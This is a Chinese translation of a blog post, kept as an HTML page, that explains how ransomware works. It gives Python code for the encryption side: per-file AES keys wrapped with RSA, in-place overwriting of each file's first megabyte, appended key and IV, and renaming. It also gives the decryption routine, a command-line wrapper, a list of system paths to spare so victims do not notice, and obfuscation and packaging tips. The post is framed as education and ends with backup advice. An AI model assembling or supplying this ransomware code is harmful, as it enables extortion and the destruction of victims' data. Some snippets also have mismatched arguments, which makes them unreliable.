<html>
<head>
<title>Architecture of a ransomware (2/2)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">勒索软件的架构(2/2)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee?source=collection_archive---------0-----------------------#2020-11-26">https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee?source=collection_archive---------0-----------------------#2020-11-26</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b8bb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在第1部分(<a class="ae kl" href="https://securityshenaningans.medium.com/architecture-of-a-ransomware-1-2-1b9fee757fcb" rel="noopener">https://securityshenanigans . medium . com/architecture-of-a-ransomware-1-2-1b 9 fee 757 fcb</a>)中，我们解释了理解高效勒索软件如何工作所必需的关键概念。在这一部分中，我们将用一些python代码来说明其中的一些概念。我们还将探讨pycryptodome python库在加密方面的基本用法。我不会公布完整的源代码，因为我不想帮助脚本小子对他们的犯罪生涯。本文的目的只是分享关于勒索软件的知识，它不应该被用于恶意活动。</p><h2 id="4442" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">总则</h2><p id="e92d" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">有多个开源勒索软件可用，在阅读勒索软件开发时，我偶然发现了一个很棒的勒索软件，叫做<a class="ae kl" href="https://github.com/tarcisio-marinho/GonnaCry" rel="noopener ugc nofollow" target="_blank"> GonnaCry </a>，作者是<a class="lk ll ep" href="https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------" rel="noopener" target="_blank"> Tarcísio Marinho </a>。代码非常清晰，我强烈建议您查看一下。<br/>他的勒索软件包含了“管理方”的所有代码。他实际上编码了攻击端的服务器，它将管理解密密钥，与被感染的客户端通信，以及更换壁纸。<br/>我不想深入这方面，因为我编写的所有代码都是为了了解勒索软件是如何工作的，而现实生活中的每一种勒索软件都以不同的方式处理这方面的事情。您可能有一个自动服务来注册付款和发送解密密钥。你可能有一个Tor邮箱地址，可以直接和受害者互动。您甚至可能有一个系统允许客户端提交几个样本文件来验证您可以解密它们。无论您有什么，这在每个活动中都有所不同，因此编写这部分代码不在我的范围之内。我主要关注客户端感染方面。</p><h2 id="547f" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">选择的语言</h2><p id="7c94" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">我选择python有几个原因。最主要的一点是它非常容易阅读和理解。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi lm"><img src="../Images/102af665122bb388e6cbbabc54c6be5a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1156/format:webp/1*FIYdNMGZo9Ye-GIkfXcHWg.png"/></div></figure><p id="0aa4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">它也可以是跨平台的，只要避免使用特定于操作系统的指令(比如用os.system调用的指令)。它也很快，并且有我们需要执行的大多数加密操作的库。最后，它允许你混淆编译后的代码，我们这样做是为了更难对最终的二进制文件进行逆向工程。</p><p id="c73f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在评估python库时，您可能会发现做同样事情的多个导入。研究每一种方法并选择最常用的方法总是一种谨慎的方法，特别是当它涉及到一个快速变化的主题时，如密码学。你不会希望你的勒索软件仅仅因为你用了和过时的库就被解密，甚至更糟的是，<a class="ae kl" href="https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/" rel="noopener ugc nofollow" target="_blank">你开发了自己的加密方案，就像Lockcrypt做的</a> ( <a class="ae kl" href="https://security.stackexchange.com/questions/18197/why-shouldnt-we-roll-our-own" rel="noopener ugc nofollow" target="_blank">不要这么做</a>)。我们将使用两个已知的python库:<a class="ae kl" href="https://pypi.org/project/pycryptodome/" rel="noopener ugc nofollow" target="_blank"> pycryptodome、</a>和<a class="ae kl" href="https://docs.python.org/3/library/secrets.html" rel="noopener ugc nofollow" target="_blank"> secrets </a>。</p><blockquote class="lu lv lw"><p id="b8c8" class="jn jo lx jp b jq jr js jt ju jv jw jx ly jz ka kb lz kd ke kf ma kh ki kj kk ij bi translated">注意:在实践中，您有包装器为您完成非对称+对称的组合加密(比如<a class="ae kl" href="https://pypi.org/project/asymcrypt/" rel="noopener ugc nofollow" target="_blank"> asymcrypt </a>)。然而，我将使用直接的pycryptodome并创建每个函数来更好地说明概念。</p></blockquote><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi mb"><img src="../Images/4b1ff11e6169977390830062c47c28c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:978/format:webp/1*ElnPSfXNWGtE2mj_sym8Kg.png"/></div></div></figure><h2 id="222e" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">必要功能概述</h2><ul class=""><li id="3ce4" class="mg mh iq jp b jq lf ju lg jy mi kc mj kg mk kk ml mm mn mo bi translated">generate32ByteKey():生成一个随机的32字节密钥。有多种方法可以做到这一点。你可以从/dev/urandom中获取一个字符串并对其求和，但是这将依赖于linux，并且我们想要跨平台地做这件事，所以我们将使用python的<a class="ae kl" href="https://docs.python.org/3/library/secrets.html" rel="noopener ugc nofollow" target="_blank"> secrets </a>库。这可以通过secrets.token_hex(32)来实现。</li><li id="e87a" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">rsarencryptsecret(string，publicKey):这将使用公钥不对称地加密一个秘密(这样它只能用私钥解密)。这将允许我们用我们的公钥加密为每个文件生成的对称密钥。客户端将需要我们的privateKey来解密每个文件的对称密钥，然后用它自己的对称密钥解密每个文件。</li><li id="b8a7" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">rsaDecryptSecret(secret，privateKey):这将使用私有非对称密钥对加密的对称密钥进行解密。</li><li id="e82f" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">symEncryptFile(publicKey，File):这个函数是最复杂的一个，因为它包含加密逻辑。这将在下面进一步解释，但顾名思义，它是用来加密文件的。</li><li id="c5ea" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">symDecryptFile(privateKey，File):解密一个文件。</li><li id="2559" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">symEncryptDirectory(publicKey，dir):这个函数将接收一个目录作为参数，并递归地遍历它以获取其中的所有文件。之后，它将使用公钥调用symEncryptFile。</li><li id="3d0a" class="mg mh iq jp b jq mp ju mq jy mr kc ms kg mt kk ml mm mn mo bi translated">symDecryptDirectory(privateKey，dir):类似于symEncryptDirectory，但是反过来…</li></ul><h2 id="b8d3" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">rsaEncryptSecret</h2><p id="dea8" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">这将使用RSA加密密钥。默认情况下，RSA加密没有任何随机性，因此我们将使用<a class="ae kl" href="https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding" rel="noopener ugc nofollow" target="_blank">最优非对称加密填充</a>(简称OAEP)，这是一种填充方案，它改进了基本RSA，增加了随机性和<a class="ae kl" href="https://en.wikipedia.org/wiki/Trapdoor_function" rel="noopener ugc nofollow" target="_blank">单向置换陷门</a>。请记住，当使用RSA和OAEP时，得到的密码大小应该与模数相同。而模数就是密钥大小/ 8。我们使用2048位RSA，所以得到的密文应该是256字节。</p><p id="a231" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这里有一个简单的代码片段来实现这一点。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="1256" class="km kn iq mv b gy mz na l nb nc">def rsaEncryptSecret(string, publicKey):<br/>  public_key = get_key(publicKey, None)<br/>  # Create the cipher object<br/>  cipher_rsa = PKCS1_OAEP.new(public_key)<br/>  # We need to encode the string to work with bytes instead of chars<br/>  bytestrings = str.encode(string)<br/>  cipher_text = cipher_rsa.encrypt(bytestrings)<br/>  #At this point the cipher_text should be 256 bytes in length<br/>  # We'll base64 encode it for convenience<br/>  # Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding <br/>  return base64.b64encode(cipher_text)</span></pre><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi nd"><img src="../Images/1f4ab4ab166cdee38318cf29155a7c60.png" data-original-src="https://miro.medium.com/v2/resize:fit:916/format:webp/1*Y1FtbpcNFZCT4CkS7ZCJ0w.png"/></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">来源:<a class="ae kl" href="https://stackoverflow.com/questions/13378815/base64-length-calculation" rel="noopener ugc nofollow" target="_blank">https://stack overflow . com/questions/13378815/base64-length-calculation</a></figcaption></figure><h2 id="51d9" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">RsaDecryptSecret</h2><p id="5bdf" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">这将使用提供的密钥解密密文。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="b871" class="km kn iq mv b gy mz na l nb nc">def rsaDecryptSecret(string, privateKey):<br/>  # We firts import the private Key<br/>  private_key = get_key(privateKey, None)<br/>  # Decode the base64 encoded string<br/>  base64DecodedSecret = base64.b64decode(string)<br/>  # create the cipher object<br/>  cipher_rsa = PKCS1_OAEP.new(private_key)<br/>  # Decrypt the content<br/>  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)<br/>  # Remember to convert the decoded cipher from bytes to string<br/>  decryptedSecret = decryptedBytestrings.decode()<br/>  return decryptedSecret</span></pre><h2 id="cb14" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">SymEncryptFile</h2><p id="1975" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">这将是主要的加密功能。事情是这样的:</p><ol class=""><li id="5049" class="mg mh iq jp b jq jr ju jv jy ni kc nj kg nk kk nl mm mn mo bi translated">使用公钥和文件路径作为参数调用函数</li></ol><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="1ab1" class="km kn iq mv b gy mz na l nb nc">def symEncryptFile(publicKey, file):</span></pre><p id="82b6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.为这个特定文件生成一个随机密钥</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="ccc8" class="km kn iq mv b gy mz na l nb nc">key = generateKey()</span></pre><p id="39f3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.用公钥加密随机密钥。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="312a" class="km kn iq mv b gy mz na l nb nc">encriptedKey = rsaEncryptSecret(key, publicKey)</span></pre><p id="6545" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.定义文件的加密大小(n字节)。在本例中，我们将使用1MB。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="669a" class="km kn iq mv b gy mz na l nb nc">buffer_size = 1048576</span></pre><p id="3bb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.检查文件是否已经加密，如果是，忽略它。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="441a" class="km kn iq mv b gy mz na l nb nc">if file.endswith("." + cryptoName):<br/> print('File is already encrypted, skipping')<br/> return</span></pre><p id="2384" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.加密文件的前n个字节并覆盖其内容。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="2db5" class="km kn iq mv b gy mz na l nb nc"># Open the input and output files<br/> input_file = open(file, 'r+b')<br/> print("Encrypting file: "+ file)<br/> output_file = open(file + '.' + cryptoName, 'w+b')</span><span id="2215" class="km kn iq mv b gy nm na l nb nc"># Create the cipher object and encrypt the data<br/> cipher_encrypt = AES.new(key, AES.MODE_CFB)</span><span id="67ad" class="km kn iq mv b gy nm na l nb nc"># Encrypt file first<br/> input_file.seek(0)<br/> buffer = input_file.read(buffer_size)<br/> ciphered_bytes = cipher_encrypt.encrypt(buffer)</span><span id="1dc9" class="km kn iq mv b gy nm na l nb nc">input_file.seek(0)<br/>input_file.write(ciphered_bytes)</span></pre><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi nn"><img src="../Images/3725e0ef3ce32fbb3bf817667bc1cd26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1396/format:webp/1*lwALB9XLN8XHbkH3GcLDlQ.png"/></div></figure><p id="c974" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.将加密的随机密钥附加到文件的末尾。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="a982" class="km kn iq mv b gy mz na l nb nc">input_file.seek(0, os.SEEK_END)<br/>input_file.write(encriptedKey.encode())</span></pre><p id="9de1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.将<a class="ae kl" href="https://en.wikipedia.org/wiki/Initialization_vector" rel="noopener ugc nofollow" target="_blank"> AES IV(初始化向量)</a>附加到文件末尾。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="8c47" class="km kn iq mv b gy mz na l nb nc">input_file.seek(0, os.SEEK_END)<br/>input_file.write(cipher_encrypt.iv)</span></pre><p id="7dc7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">9.重命名文件以识别它。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="7e26" class="km kn iq mv b gy mz na l nb nc">input_file.close()<br/> os.rename(file, file + "." + cryptoName)</span></pre><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi no"><img src="../Images/bd9a9d3a2f5c183034897bd0e29eca39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uhLCP4sE8qkNCCKqShwiWw.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">解密后文件结构的粗略模型</figcaption></figure><p id="964b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，我们并不需要复制整个文件，我们只是在file对象上使用了<code class="fe np nq nr mv b">seek()</code>方法来导航字节，使这个过程尽可能快。这也将在解密函数中使用。</p><p id="bd2e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">还要注意，由于我们在加密文件中写入了AES IV和加密密钥，我们不需要任何类型的txt文件来跟踪每个加密文件。受害者可以向我们发送任何文件，只要我们有用于特定二进制文件的私钥，我们就能解密它。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi ns"><img src="../Images/6db62a36c84ce249e3d83c89b04559d4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7BK3Y7ueoqEAXF0w-Dw4GQ.png"/></div></div></figure><h2 id="8469" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">符号解密文件</h2><p id="4867" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">这将是主要的解密函数。事情是这样的:</p><ol class=""><li id="ef8c" class="mg mh iq jp b jq jr ju jv jy ni kc nj kg nk kk nl mm mn mo bi translated">使用privateKey和文件路径作为参数调用函数</li></ol><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="b589" class="km kn iq mv b gy mz na l nb nc">def symDecryptFile(privateKey, file):</span></pre><p id="486d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">2.定义文件的解密大小(n字节)(等于加密中使用的大小)。在我们的例子中，我们使用1MB。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="893e" class="km kn iq mv b gy mz na l nb nc">buffer_size = 1048576</span></pre><p id="c161" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">3.验证该文件已加密(带扩展名)。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="360b" class="km kn iq mv b gy mz na l nb nc">if file.endswith("." + cryptoName):<br/>        out_filename = file[:-(len(cryptoName) + 1)]<br/>        print("Decrypting file: " + file)<br/>    else:<br/>        print('File is not encrypted')<br/>        return</span></pre><p id="0ecd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">4.打开文件并读取AES IV(最后16个字节)。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="75ae" class="km kn iq mv b gy mz na l nb nc">input_file = open(file, 'r+b')</span><span id="6c1c" class="km kn iq mv b gy nm na l nb nc"># Read in the iv<br/>    input_file.seek(-16, os.SEEK_END)<br/>    iv = input_file.read(16)</span></pre><p id="c2f2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">5.读取加密的解密密钥。这将是</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="af16" class="km kn iq mv b gy mz na l nb nc"># we move the pointer to 274 bytes before the end of file<br/># (258 bytes of the encryption key + 16 of the AES IV)<br/>input_file.seek(-274, os.SEEK_END)<br/># And we read the 258 bytes of the key<br/>secret = input_file.read(258)</span></pre><p id="f589" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">6.用提供的私钥解密加密的密钥</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="e16b" class="km kn iq mv b gy mz na l nb nc">key = rsaDecryptSecret(cert, secret)</span></pre><p id="df7d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">7.解密我们之前定义的aes加密的缓冲区大小，并将其写入文件的开头</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="8920" class="km kn iq mv b gy mz na l nb nc"># Create the cipher object<br/>cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)                                                                                                                            <br/># Read the encrypted header                                                                                              <br/>input_file.seek(0)                                                                                                                                                            <br/>buffer = input_file.read(buffer_size)                                                                                                                                         <br/># Decrypt the header with the key<br/>decrypted_bytes = cipher_encrypt.decrypt(buffer) <br/># Write the decrypted text on the same file                                                                                                                             <br/>input_file.seek(0)                                                                                                                                                            <br/>input_file.write(decrypted_bytes)</span></pre><p id="c283" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">8.从文件末尾删除iv +加密密钥，并将其重命名。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="5bf4" class="km kn iq mv b gy mz na l nb nc"># Delete the last 274 bytes from the IV + key.                                                                                                                                             <br/>input_file.seek(-274, os.SEEK_END)                                                                                                                                            <br/>input_file.truncate()                                                                                                                                                         <br/>input_file.close() <br/># Rename the file to delete the encrypted extension                                                                                                                                                           <br/>os.rename(file, out_filename)</span></pre><h2 id="90a1" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">最终考虑</h2><p id="9a48" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">有了所有这些功能，您可以创建一个二进制文件，让您加密或解密您选择的文件夹。如果您正确地编写了symEncryptDirectory/symDecryptDirectory函数，您可以只选择参数文件夹/文件的加密或解密，并只传递一个. pem文件。在主调用之前，二进制文件上会有类似这样的内容。</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="4814" class="km kn iq mv b gy mz na l nb nc">parser = argparse.ArgumentParser()</span><span id="9604" class="km kn iq mv b gy nm na l nb nc">parser.add_argument("--dest", "-d", help="File or directory to encrypt/decrypt", dest="destination", default="none", required=True)</span><span id="8d13" class="km kn iq mv b gy nm na l nb nc">parser.add_argument("--action", "-a", help="Action (encrypt/decrypt)", dest="action", required=True)<br/> <br/>parser.add_argument("--pem","-p", help="Public/Private key", dest="key", required=True)</span></pre><p id="81a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">除了明显的错误验证缺失(检查“加密”操作是否有作为参数传递的公钥，“解密”操作是否有私钥，等等)，您必须为每个操作系统定义一个文件/文件夹的“白名单”。你需要这样做，以保持电脑“可用”但被加密。如果您刚开始加密看到的每个文件，您可能会:</p><p id="1c3f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">1.让用户无法使用计算机，他们会意识到出了问题。加密所有内容后，系统不会启动，用户也不会知道自己受到了勒索软件的攻击。</p><p id="ee1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">举个例子，在Linux中，白名单类似于这样:</p><pre class="ln lo lp lq gt mu mv mw mx aw my bi"><span id="6dc9" class="km kn iq mv b gy mz na l nb nc">whitelist = ["/etc/ssh", "/etc/pam.d", "/etc/security/", "/boot", "/run", "/usr", "/snap", "/var", "/sys", "/proc", "/dev", "/bin", "/sbin", "/lib", "passwd", "shadow", "known_hosts", "sshd_config", "/home/sec/.viminfo", '/etc/crontab', "/etc/default/locale", "/etc/environment"]</span></pre><p id="48b3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你可能会想打包。py脚本及其所有依赖项，并将其捆绑到一个可执行文件中。我不打算一步一步的展示，但是你可以调查一下<a class="ae kl" href="https://pypi.org/project/pyarmor/" rel="noopener ugc nofollow" target="_blank"> pyarmor </a>和<a class="ae kl" href="https://www.pyinstaller.org/" rel="noopener ugc nofollow" target="_blank"> pyinstaller </a>。此外，根据您想要使用的混淆类型(以及二进制文件的类型)，<a class="ae kl" href="https://github.com/Nuitka/Nuitka" rel="noopener ugc nofollow" target="_blank"> Nuitka </a>可能会有很大的帮助。</p><h2 id="f4f4" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">其他类型的勒索软件(MBR加密)</h2><p id="aa80" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">还有另一种我们没有接触过的勒索软件，它们会感染你硬盘的主引导记录。这反过来允许它运行一个有效负载，该有效负载将加密文件系统的NTFS文件表，这将使磁盘不可用。这种方法非常快速，因为恶意软件只需要加密一小部分数据。<a class="ae kl" href="https://en.wikipedia.org/wiki/Petya_(malware)" rel="noopener ugc nofollow" target="_blank">pet ya勒索软件是这种设计的一个很好的例子。</a>它有三个主要缺点:<br/>第一个是，即使操作系统无法启动，你仍然可以通过取证分析恢复你的文件。它们不会被删除，只是在文件表中被取消引用。即使恶意软件在重新启动计算机后开始对原始数据进行加密，如果受害者只是关闭计算机并取出磁盘，通过一些取证分析，这些文件应该是可以恢复的。<br/>第二个缺点是<a class="ae kl" href="https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/" rel="noopener ugc nofollow" target="_blank">大多数现代操作系统不再使用MBR，因为它们已经迁移到GPT </a> (GUID分区表)。<br/>第三个缺点是它严重依赖于文件系统，并且需要修改以适应其他不像NTFS的文件系统类型(想想EXT3/EXT4，ZFS等等)。这种方法需要更多的底层技术概念，我不想把这篇文章扩展太多。此外，这种方法不是最常用的，我写这篇文章的主要目的是让读者更好地了解“常见”的勒索软件。</p><h2 id="c10a" class="km kn iq bd ko kp kq dn kr ks kt dp ku jy kv kw kx kc ky kz la kg lb lc ld le bi translated">结论/一般性建议</h2><p id="8ae4" class="pw-post-body-paragraph jn jo iq jp b jq lf js jt ju lg jw jx jy lh ka kb kc li ke kf kg lj ki kj kk ij bi translated">除了你应该知道的明显的常见建议(不要打开未知来源的附件，保持基础设施更新，运行反恶意软件等)，我可以推荐的主要预防技术是备份、备份和备份…你会听到很多关于如何防止攻击的建议，但<strong class="jp ir">在我看来</strong>，最好是始终假设你最终会被感染，并对你的数据进行离线备份。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/9ee5fc9066543132a8703c9052f83ea2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*-Uclf_8OCMvM3u6c1CtQDw.png"/></div></figure><p id="49a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使您受过100%识别恶意载体的训练，您组织的某个用户也可能不是，这就是加密所有映射的共享驱动器所需的全部内容。</p><blockquote class="lu lv lw"><p id="050c" class="jn jo lx jp b jq jr js jt ju jv jw jx ly jz ka kb lz kd ke kf ma kh ki kj kk ij bi translated">最后，有一点我没见过有人推荐:如果你被感染了，并且加密的文件不需要马上恢复(家庭照片、视频等)，试着保留一份加密文件的副本。有时，恶意软件开发者要么退休(<a class="ae kl" href="https://www.zdnet.com/article/shade-troldesh-ransomware-shuts-down-and-releases-all-decryption-keys/" rel="noopener ugc nofollow" target="_blank"> Shade </a>、<a class="ae kl" href="https://www.jdsupra.com/legalnews/teslacrypt-ransomware-developers-retire-60100/" rel="noopener ugc nofollow" target="_blank"> TeslaCrypt </a>、<a class="ae kl" href="https://www.bleepingcomputer.com/news/security/hildacrypt-ransomware-developer-releases-decryption-keys/" rel="noopener ugc nofollow" target="_blank"> HildaCrypt </a>)，要么被捕(<a class="ae kl" href="https://www.kaspersky.com/blog/coinvault-in-court/23123/" rel="noopener ugc nofollow" target="_blank"> CoinVault </a>)，甚至公布其竞争对手的密钥(<a class="ae kl" href="https://blog.malwarebytes.com/cybercrime/2016/07/keys-to-chimera-ransomware-leaked/" rel="noopener ugc nofollow" target="_blank"> Petya vs Chimera </a>)，在所有这些情况下，解密密钥都可能被公布。你可能会很幸运，在几个月后恢复你的文件。</p></blockquote><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nu"><img src="../Images/cc7e925cf96afddc462bdd3b3ec219a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DOlJnnXFGoJYqMrnbAwV2Q.png"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">阴影创作者的退休信。</figcaption></figure><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/16e9ebbb5750d2b8f670f97bf87c4c96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1292/format:webp/1*oIiVovl7gd9HuQ1FuqrKCg.png"/></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">TeslaCrypt创作者的退休信。</figcaption></figure><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="mc md di me bf mf"><div class="gh gi nw"><img src="../Images/74f44acf99ffaee9757622e1a861a39b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*PdjfixQTYSPrMxe4.jpg"/></div></div><figcaption class="ne nf gj gh gi ng nh bd b be z dk translated">HildaCrypt发布密钥。</figcaption></figure><p id="424c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这个帖子到此为止。我希望这是有帮助的，并且你现在有更好的工具来应对你的下一次勒索！</p></div></div>    
</body>
</html>